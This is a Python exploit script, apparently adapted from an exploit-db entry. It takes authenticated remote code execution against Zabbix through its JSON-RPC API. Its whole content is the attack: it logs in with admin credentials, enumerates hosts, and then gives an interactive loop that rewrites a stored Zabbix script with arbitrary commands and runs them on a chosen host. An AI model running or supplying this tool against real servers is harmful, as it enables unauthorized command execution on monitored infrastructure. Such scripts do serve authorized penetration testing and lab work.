#!/usr/bin/env python
# -*- coding: utf-8 -*-
# References: https://www.exploit-db.com/exploits/39937
# Description: Zabbix RCE via JSON-RPC API
# Author: joelczk

import requests
import json 
import sys
import argparse

header = {"Content-Type": "application/json"}
headers = {
    'content-type': 'application/json',
}

def get_auth_id(url, username, password):
    payload = {
        "jsonrpc" : "2.0",
        "method" : "user.login",
        "params": {
            'user': ""+username+"",
            'password': ""+password+"",
        },
        "auth" : None,
        "id" : 0,
    }
    auth = requests.post(url, data=json.dumps(payload),headers=(headers),verify=False)
    auth = auth.json()
    try:
        auth_id = auth['result']
        print("[*] Obtained auth_id : {auth_id}".format(auth_id=auth_id))
        return auth
    except:
        print("[!] An error occured! Please check if the credentials are valid!")
        sys.exit()

def get_host_id(url, auth):
    data = {
        "jsonrpc":"2.0",
        "method":"host.get",
        "params":{
            "output":["hostid","name"],
            "filter":{"host":""}
        },
        "auth":""+auth['result']+"",
        "id":1,
    } 
    hostid = requests.post(url, data=json.dumps(data), headers=(headers), verify=False)
    hostid = hostid.json()
    hostids = []
    for hid in hostid['result']:
        hostids.append(str(hid['hostid']))
        print ("    {hostid}:{name}".format(hostid=str(hid['hostid']),name=str(hid['name'])))
    return hostids

def zabbix_rce(url, auth, hostids):
    hostid = None
    while True:
        hostid = input("[host_id] >>: Please input the hostid: ") 
        if hostid in hostids:
            break
        else:
            print("[!] Hostid not in the list of hostids! Please try again!")
            continue
    while True:
        cmd = input('[zabbix_cmd]>>: ')
        if cmd == "": continue
        if cmd == "quit" or cmd == "exit": break
        payload = {
            "jsonrpc": "2.0",
            "method": "script.update",
            "params": {
                "scriptid": "1",
                "command": ""+cmd+""
            },
            "auth" : auth['result'],
            "id" : 0,
        }
        try:
            cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers), verify=False)
        except:
            print("[!] Invalid command! Please try again!")
        payload = {
            "jsonrpc": "2.0",
            "method": "script.execute",
            "params": {
                "scriptid": "1",
                "hostid": ""+hostid+""
            },
            "auth" : auth['result'],
            "id" : 0,
        }
        try:
            cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers), verify=False)
            cmd_exe = cmd_exe.json()
            print (cmd_exe["result"]["value"])
        except:
            print("[!] Invalid command! Please try again!")             
def exploit(username,password,url):
    print('[+] Logging into Zabbix ({username}:{password})'.format(username=username,password=password))
    auth = get_auth_id(url, username, password)
    print('[+] Listing hostids')
    hostids = get_host_id(url, auth)
    print('[+] Spawning Interactive Shell...')
    zabbix_rce(url, auth, hostids)
    
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', help="Zabbix URL")
    parser.add_argument('--username', help="Admin username of Zabbix user (Default: Admin)")
    parser.add_argument('--password', help = "Password for Zabbix user (Default: zabbix)")
    args = parser.parse_args()
    url = str(args.url) + "/api_jsonrpc.php"
    exploit(args.username, args.password, url)
